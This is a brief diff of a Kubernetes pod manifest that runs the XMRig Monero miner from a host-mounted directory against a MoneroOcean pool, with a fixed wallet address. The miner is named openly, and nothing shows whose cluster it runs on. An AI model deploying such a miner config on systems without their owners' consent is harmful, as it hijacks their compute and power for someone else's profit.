@@ -7,7 +7,7 @@ spec:
   - name: xmrig-container
     image: busybox
     command:
-    - /xmrig/build/xmrig
+    - ./xmrig
     args:
     - -o
     - gulf.moneroocean.stream:80
@@ -15,3 +15,10 @@ spec:
     - 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5
     - -p
     - piD3ceiver
+    volumeMounts:
+    - name: xmrig-volume
+      mountPath: /xmrig
+  volumes:
+  - name: xmrig-volume
+    hostPath:
+      path: /xmrig/build
